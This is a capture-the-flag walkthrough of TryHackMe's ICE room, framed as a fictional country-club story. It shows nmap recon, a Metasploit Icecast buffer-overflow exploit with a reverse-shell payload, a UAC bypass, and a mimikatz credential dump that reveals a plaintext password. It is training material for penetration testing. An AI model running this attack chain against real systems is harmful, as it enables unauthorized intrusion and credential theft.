---
title: "Breaking ICE"
date: 2022-07-28
excerpt: 
pageId: 97a88d0f9c8545d6b6ff585745cfed09
tags:
  - Exploitation
  - Metasploit
  - TryHackMe
---

TryHackMe’s [ICE](https://tryhackme.com/room/ice) room is an easy boot-to-root process that exploits a basic (albeit specific) misconfiguration. How would it be done in a real-world scenario? Fictionalizing what this would look like will hopefully make this walk-through a little more interesting and relatable. Of course, this example is entirely made-up. In any real-world scenario, you will need authorization to test something like this legally! Exploits can have unintended consequences, including permanent damage and data loss.

# The Challenge

Imagine that you’re a mildly underemployed entry-level IT person in an old country club which doesn’t have the budget to upgrade its computers. These computers are mostly ancient Windows 7 desktops which work fine enough for the basic admin tasks your colleagues need to perform. One day, as you pass by a window to a locked cubicle, a glowing monitor catches your eye that seems to be running something out of the ordinary:

{% figure "The computer in the office is running Icecast! You can tell if you look really closely." %}{% image "forest-4389061_1920-edb44a0c.jpg", "The computer in the office is running Icecast! You can tell if you look really closely." %}{% endfigure %}

{% figure "This is what it looks like up close." %}{% image "Untitled-0b3eadb3.png", "This is what it looks like up close." %}{% endfigure %}

Naturally, being the curious and bored person you are, you do research on “Icecast” which you have never heard of before. 

Apparently, Icecast is an open-source media streaming program first released in 1999. It is used worldwide mainly for music, and in your country club’s case, you realize that the music tracks listed on the screen you passed by are the tinny annoying songs that play on repeat all day in the club’s restaurants and lobbies.

The club needs better music. If you can somehow find that machine on the network to manage the Icecast service, you can do your coworkers and customers a service by improving it. 

# Recon

The first step to finding the PC on the network is running a scan. You know this because you’ve been studying cybersecurity fundamentals in your free time. A quick look at the network configuration reveals that the club operates on a host of independent access points per location, each with their own network behind a NAT in the 192.168.1.x range. Nearby the computer you saw, the strongest network is named “Admin Department.” You fire up your PC on which you dual-booted Kali Linux. After connecting to the WiFi network, you run:

```shell
$ sudo nmap -sS -sC -sV -vvv 192.168.1.1/24
```

{% aside %}
This does a version and script scan on your network. From left to right, it reads:\
`sudo` - to ensure proper permissions to perform the type of scan we want\
`nmap` - self-explanatory\
`-sS` - do a TCP SYN Stealth scan\
`-sC` - use the default scan scripts \
`-sV` - enable version detection\
`-vvv` - verbosity level three, or Very Very Verbose\
`192.168.1.1/24` - the IP address range to scan. *Note that in the [TryHackMe room](https://tryhackme.com/room/ice), you can use the target machine’s IP here instead*\
If you don’t know this all already, I covered it before in {% mentionPageId "3452e442-489b-4e74-ad88-9fd90b519cf8" %}. To put that article in three words: nmap is awesome! You should study it if you haven’t already. 
{% endaside %}

Combing through the host of results, you find the Icecast machine! The bold lines are important. They tell you what the machine’s IP address is so you can reach it on the network, and that the Icecast service is running on port 8000.

```plain text
**Nmap scan report for 192.168.1.17**
Host is up, received echo-reply ttl 127 (0.26s latency).
Scanned at 2022-07-28 11:13:01 PST for 322s
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
|_ssl-date: 2022-07-28T03:16:10+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: CATHY-PC
|   NetBIOS_Domain_Name: CATHY-PC
|   NetBIOS_Computer_Name: CATHY-PC
|   DNS_Domain_Name: Cathy-PC
|   DNS_Computer_Name: Cathy-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2022-07-28T03:15:51+00:00
| ssl-cert: Subject: commonName=Cathy-PC
| Issuer: commonName=Cathy-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-07-27T03:03:00
| Not valid after:  2023-01-26T03:03:00
| MD5:   f480 14dc bf1f 74fd 3e46 df5f 2649 9091
| SHA-1: acb9 4348 ace0 3589 d8ff 38dd 9da8 36c3 1e38 c497
| -----BEGIN CERTIFICATE-----
| MIIC0jCCAbqgAwIBAgIQUt9byo0tFoNPNnp8cvZTOjANBgkqhkiG9w0BAQUFADAS
| MRAwDgYDVQQDEwdEYXJrLVBDMB4XDTIyMDcyNzAzMDMwMFoXDTIzMDEyNjAzMDMw
| MFowEjEQMA4GA1UEAxMHRGFyay1QQzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
| AQoCggEBANI+nyKOxGFNbybgKuTtx+j4Fi+6N6VbZL01eKxGaXB6QOz7PEBckXrj
| Dos0ZdZ4n5SSmmI2afEDsf78fio6mfUE/Zc0Ndp3eyqvUh/wJyw1TYgt7MNofCBL
| XAWXpzJuatMWtpbyBR1Mi+QeQ+ByFvfUBt69IAvevDJjRrid8VkdY4QqekopSgRv
| 2s4Ku6S1Do/OAt1Rgdvy4wphhQkSb3IFjNMXPpUqSGL2KBTFO6rnh7o7vMiaZu1c
| O89cIJF0wqLhnYokIFyte0xwFRPinsd7lJMMfXepjcgr2DPBWE6Pnv69uY54UXJP
| rON2Rr2bS6iO0hV+hI3I8ioxVvA9NNECAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYB
| BQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQB+xENh+Xa1vcOs
| w2zx2G4eUaUWO4BYTTcj1nSCqAdbsXd5cqVEOm5aw5rKjtymZdosAaoqKoWzngEl
| QIuy70ifoAxnF5243VNG0tuApb43cSMuvQxBy5Ev5rMgRVSZG/APeUUn80apVzJM
| m3B4hIJIBk73FJaXEfm1KVpr/JMEc4ckxsCc/CqTzAhKgoC0o1ApqOKRfQVWSFwD
| 9nWbWueEmhAWPCmpmq7oC2QQ/mudrspcaZOkeqPKuuTV/0r8JmHlIC7XZ+daBKYi
| n835Z9P35IEY4wKagGqYzAtCTDkO9bD9IeSCUx6r1UG05h0ogsl4D8Tb6dp1hCYR
| 6Vz4sRYI
|_-----END CERTIFICATE-----
5357/tcp  open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
**8000/tcp  open  http               syn-ack ttl 127 Icecast streaming media server**
| http-methods:
|_  Supported Methods: GET
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49159/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: CATHY-PC; **OS: Windows**; CPE: cpe:/o:microsoft:windows
```

## Checking for vulnerabilities

Knowing that this is the device’s IP address and it is running Icecast, you open up `msfconsole` to discover what else you can learn about it.

```plain text
msf6 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
```

Fascinating. There is only one Metasploit result for Icecast! What is this exploit?

```plain text
Description:
  This module exploits a buffer overflow in the header parsing of
  icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma.
  Sending 32 HTTP headers will cause a write one past the end of a
  pointer array. On win32 this happens to overwrite the saved
  instruction pointer, and on linux (depending on compiler, etc) this
  seems to generally overwrite nothing crucial (read not exploitable).
  This exploit uses ExitThread(), this will leave icecast thinking the
  thread is still in use, and the thread counter won't be decremented.
  This means for each time your payload exits, the counter will be
  left incremented, and eventually the threadpool limit will be maxed.
  So you can multihit, but only till you fill the threadpool.
```

That sounds complicated, but in short, as one of the [references](https://nvd.nist.gov/vuln/detail/CVE-2004-1561) states, the vulnerability “allows remote attackers to execute arbitrary code via an HTTP request with a large number of headers.” Icecast version 2.0.1 and earlier is vulnerable to a [buffer overflow](https://www.cvedetails.com/cve/CVE-2004-1561/). That’s big. 

After obtaining authorization from your boss, you try exploiting this vulnerability. Thrilled, she gives permission for you to break into the machine and even change the music, which she agrees is terrible, as long as you can fix it afterward. 

# Gaining a foothold

The exploit requires a few basic options which you double-check before running this exploit. First and foremost is `RHOSTS`, but `LHOST` is important if you’re running on a VPN. You set all these options appropriately with `set <option> <value>`.

```plain text
msf6 > use exploit/windows/http/icecast_header
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/icecast_header) > options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.1.17     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Usin
                                      g-Metasploit
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     eth0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

The options all check out! `RPORT` is set to the Icecast port we discovered earlier. You run `exploit`. 👨‍💻

```plain text
msf6 exploit(windows/http/icecast_header) > exploit

[*] Started reverse TCP handler on 192.168.1.158:4444
[*] Sending stage (175686 bytes) to 192.168.1.17
[*] Meterpreter session 1 opened (192.168.1.158:4444 -> 192.168.1.17:49323) at 2022-07-28 13:13:28 +0800

meterpreter > sysinfo
Computer        : CATHY-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getpid
Current pid: 2344
meterpreter > ps
...
2344  1520  Icecast2.exe          x86   1        Cathy-PC\Cathy C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
...
```

And you’re in! Your initial inspection indicates that you’re operating in the Icecast2.exe process as the user Cathy. What were you here to do again? Ah, yes. You wanted to change the club’s awful background music and fix the vulnerability.

# Escalation

To get to the music, you’ll need more privileges than those currently available:

```plain text
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

Time to escalate. You can use the script that the [Rapid7 team](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/) developed: `post/multi/recon/local_exploit_suggester`, after moving the current session to the background with `Ctrl-Z` and `set`ting the session. Where does this take you?

```plain text
msf6 post(multi/recon/local_exploit_suggester) > exploit

[*] 10.10.195.113 - Collecting local exploits for x86/windows...
...
[*] 10.10.195.113 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/ikeext_service                           Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms10_092_schelevator                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
...
[*] Post module execution completed
```

There are ten options. What does the first one do?

```plain text
msf6 post(multi/recon/local_exploit_suggester) >  info exploit/windows/local/bypassuac_eventvwr

       Name: Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
     Module: exploit/windows/local/bypassuac_eventvwr
   Platform: Windows
       Arch:
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2016-08-15
...
Description:
  This module will bypass Windows UAC by hijacking a special key in
  the Registry under the current user hive, and inserting a custom
  command that will get invoked when the Windows Event Viewer is
  launched. It will spawn a second shell that has the UAC flag turned
  off. This module modifies a registry key, but cleans up the key once
  the payload has been invoked. The module does not require the
  architecture of the payload to match the OS. If specifying
  EXE::Custom your DLL should call ExitProcess() after starting your
  payload in a separate process. 
```

Since you want to gain permissions to be able to configure Icecast, this module should suffice.

```plain text
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/bypassuac_eventvwr
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_eventvwr) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac_eventvwr) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/bypassuac_eventvwr) > run

[*] Started reverse TCP handler on 10.18.73.99:4444
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (175686 bytes) to 10.10.195.113
[*] Meterpreter session 2 opened (10.18.73.99:4444 -> 10.10.195.113:49383) at 2022-07-28 14:10:25 +0800
[*] Cleaning up registry keys ...

meterpreter >
```

# Post-exploitation and looting

Alright! Now that you have administrator access, you can do quite a bit.

```plain text
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

With these privileges, you can enable remote desktop…

```plain text
meterpreter > run post/windows/manage/enable_rdp

[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[*]     Opening port in local firewall if necessary
```

Great. Now that’s done, you need the password of a user on the PC to log on. And yes, Cathy and your boss gave you permission to do this. All you have to do is find the printer spool service and migrate to it, then load the kiwi extension. Why the spool service specifically? It can interact with lsass.exe (the Windows security authority process) and start up again in case you crash it. 

```plain text
meterpreter > pgrep spoolsv.exe
1272
meterpreter > migrate 1272
[*] Migrating from 3468 to 1272...
[*] Migration completed successfully.
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

Now, you grab all the passwords.

```plain text
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
```

There is more to security than computer configuration. Sometimes humans are misconfigured and set weak passwords like this one 😉. With this password, you run the following command in a Kali terminal to open FreeRDP.

```shell
$ xfreerdp /u:Dark /p:Password01\!~ /v:10.10.195.113
```

{% figure "Commence sneaky chuckling and hand-rubbing." %}{% image "Untitled-b61c7ce9.png", "Commence sneaky chuckling and hand-rubbing." %}{% endfigure %}

You replace the source clients’ music selections and the nondescript scratchy pop music is all but annihilated. In its place you put pleasing impressionist classical pieces. Immediately, you hear what sounds like a sigh of relief from all your coworkers. The freedom from that soul-stifling music is exhilarating.

Finally, you tear out Windows 7 and Icecast 2.0.1 and replace them with updated and patched counterparts with antivirus enabled. A job well done. The ice can no longer be broken.

Indeed, you could have walked up to the computer directly or simply asked Cathy to change the music like a normal person. But this process was far more educational, exciting, and valuable. Hopefully, you learned a thing or two along the way about penetration testing as well. 



